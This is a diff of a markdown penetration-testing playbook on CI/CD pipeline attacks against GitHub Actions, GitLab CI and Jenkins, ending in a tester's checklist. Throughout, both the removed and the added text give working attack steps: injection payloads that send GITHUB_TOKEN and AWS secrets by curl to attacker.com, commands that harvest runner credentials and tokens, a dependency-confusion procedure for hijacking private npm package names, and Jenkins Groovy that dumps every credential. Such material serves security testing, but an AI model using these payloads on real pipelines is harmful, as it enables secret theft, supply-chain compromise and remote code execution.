@@ -1,83 +1,118 @@
-# CI/CD Pipeline Attacks
+# CI/CD Pipeline Attack Techniques
 
-## Attack Surface
+Covers GitHub Actions, GitLab CI, Jenkins, and supply chain via pipeline.
 
-| Platform | Secrets Location | OIDC Federation | Runner Risk |
-|----------|-----------------|-----------------|-------------|
-| GitHub Actions | Repository/Org secrets, OIDC tokens | AWS/GCP/Azure via `aws-actions/configure-aws-credentials` | Self-hosted = RCE on infra |
-| GitLab CI | CI/CD Variables, Vault integration | GCP workload identity, AWS OIDC | Shared runners = isolation bypass |
-| Azure DevOps | Variable Groups, Service Connections | Azure RM service connections | Agent pools with broad access |
-| Jenkins | Credentials store, env vars in Jenkinsfile | Plugin-based cloud auth | Controller = keys to kingdom |
+---
 
-## GitHub Actions Exploitation
+## Recon
 
-### Workflow Injection (PR-based)
+```bash
+# GitHub: find workflow files
+find . -path '.github/workflows/*.yml' -exec grep -l "pull_request_target\|workflow_dispatch\|issue_comment" {} \;
+
+# GitLab: check .gitlab-ci.yml for privileged runners
+grep -E "privileged|docker-in-docker|dind|services:" .gitlab-ci.yml
+
+# Jenkins: discover Jenkinsfiles, check /script endpoint
+curl -sk "$JENKINS_URL/script" -w "%{http_code}"
+```
+
+---
+
+## Attack Vectors
+
+### 1. GitHub Actions — pull_request_target Poisoning
+**Trigger:** Workflow uses `pull_request_target` + checks out PR code
+**Attack:** PR from fork injects malicious code into trusted context
 ```yaml
-# Vulnerable pattern: uses PR title/body in run step
-- run: echo "${{ github.event.pull_request.title }}"
-# Inject: PR title = `"; curl attacker.com/$(cat $GITHUB_TOKEN) #`
+# Vulnerable pattern:
+on: pull_request_target
+steps:
+  - uses: actions/checkout@v3
+    with:
+      ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
+  - run: make build  # Runs attacker's Makefile
 ```
+**Impact:** Secret exfiltration, repo write access
 
-### OIDC Federation Abuse
+### 2. GitHub Actions — Expression Injection
+**Trigger:** Workflow interpolates user-controlled values unsanitized
+```yaml
+# Vulnerable:
+- run: echo "Issue: ${{ github.event.issue.title }}"
+# Payload in issue title: "; curl attacker.com/$(cat $GITHUB_TOKEN)"
+```
+**Impact:** Secret exfil, arbitrary command execution
+
+### 3. Artifact Poisoning
+**Trigger:** Workflow downloads artifacts from another workflow without verification
 ```bash
-# If subject condition is too broad (e.g., repo:org/* instead of repo:org/repo:ref:refs/heads/main)
-# Any workflow in the org can assume the production role
-# Check: aws iam get-role --role-name <role> | jq '.Role.AssumeRolePolicyDocument'
-# Look for: "token.actions.githubusercontent.com" with weak conditions
+# Upload malicious artifact in PR workflow
+# Trusted workflow downloads and executes it
+gh api repos/org/repo/actions/artifacts --jq '.artifacts[].name'
 ```
+**Impact:** Code execution in trusted workflow context
 
-### Self-Hosted Runner Exploitation
+### 4. Self-Hosted Runner Escape
+**Trigger:** Self-hosted runners without ephemeral configuration
 ```bash
-# If you can trigger a workflow on a self-hosted runner:
-# 1. Access cloud metadata (runner on EC2/GCE)
-# 2. Read other repos' secrets (shared runner across repos)
-# 3. Persist on the runner machine (no ephemeral cleanup)
-# 4. Pivot to internal network (runner inside VPC)
+# After code execution on runner:
+# Check for persistent credentials
+find / -name ".credentials" -o -name ".runner" 2>/dev/null
+cat /home/runner/.credentials_rsaparams
+# Check for docker socket
+ls -la /var/run/docker.sock
+# Other workflows' secrets may be cached
+env | grep -i token
+cat $RUNNER_TEMP/.setup_*
+```
+**Impact:** Lateral movement to other repos, persistent access
+
+### 5. GitLab CI — Shared Runner Secrets
+**Trigger:** Protected variables accessible from unprotected branches
+```yaml
+# Check if CI variables leak to MR pipelines
+# In .gitlab-ci.yml of MR:
+test:
+  script:
+    - env | sort  # Shows all available CI variables
+    - echo $DEPLOY_KEY | base64
 ```
 
-### Secrets Extraction
+### 6. Dependency Confusion in CI
+**Trigger:** Private packages without namespace protection
 ```bash
-# Secrets are masked in logs but can be exfiltrated:
-# Base64 encode (bypasses masking)
-- run: echo "${{ secrets.AWS_KEY }}" | base64
-# Or via network
-- run: curl https://attacker.com/?s=$(echo "${{ secrets.AWS_KEY }}" | base64)
+# Find private package names from lock files
+grep -oE '"@[^/]+/[^"]+"' package-lock.json | sort -u
+# Check if namespace is claimed on public registry
+npm view @company/internal-lib 2>&1
+# If "Not found" → register it on npmjs → pipeline installs yours
+```
+**Impact:** Code execution during build (every dev machine + CI)
+
+### 7. Jenkins Script Console / Groovy
+**Trigger:** Jenkins accessible, /script endpoint not locked
+```groovy
+// Remote code execution via script console
+def cmd = "cat /etc/passwd".execute()
+println cmd.text
+
+// Dump all credentials
+import jenkins.model.*
+Jenkins.instance.getAllItems(org.jenkinsci.plugins.workflow.job.WorkflowJob).each {
+  it.getEnvironment(null).each { k, v -> println "$k=$v" }
+}
 ```
 
-## GitLab CI Exploitation
+---
 
-### Protected Branch Bypass
-```bash
-# Protected variables only available on protected branches
-# If you can push to a protected branch (maintainer role) → access production secrets
-# Check: Settings → CI/CD → Variables → "Protected" flag
-```
+## Checklist (add to ctest Phase 3)
 
-### Shared Runner Escape
-```bash
-# GitLab shared runners use Docker-in-Docker or Kubernetes executors
-# If privileged DinD: container escape techniques apply (see container-escape.md)
-# If K8s executor: SA token in pod may have cluster access
-```
-
-## Common Findings
-
-| Finding | Severity | Impact |
-|---------|----------|--------|
-| OIDC federation with wildcard subject | Critical | Any workflow assumes production role |
-| Secrets in workflow logs (masking bypass) | High | Credential exposure |
-| Self-hosted runner on production VPC | High | Network pivot to internal services |
-| PR trigger with `pull_request_target` + checkout of PR code | Critical | Arbitrary code execution with repo secrets |
-| Hardcoded credentials in pipeline config | High | Persistent access |
-| No branch protection on deployment workflows | Medium | Unauthorized deployments |
-| Shared runner across security boundaries | Medium | Cross-project secret access |
-
-## Tools
-
-| Tool | Purpose |
-|------|---------|
-| Gato | GitHub Actions exploitation |
-| gh (CLI) | Workflow enumeration, secret detection |
-| trufflehog | Scan git history for secrets |
-| Legitify | GitHub/GitLab org security posture |
-| Poutine | CI/CD pipeline security scanner |
+- [ ] Workflow files reviewed for injection points
+- [ ] pull_request_target + checkout pattern checked
+- [ ] Expression injection in run: steps checked
+- [ ] Artifact trust boundaries verified
+- [ ] Self-hosted runner isolation assessed
+- [ ] CI secrets scope (protected vs unprotected branches)
+- [ ] Dependency confusion on private packages
+- [ ] Jenkins /script, /scriptApproval accessibility
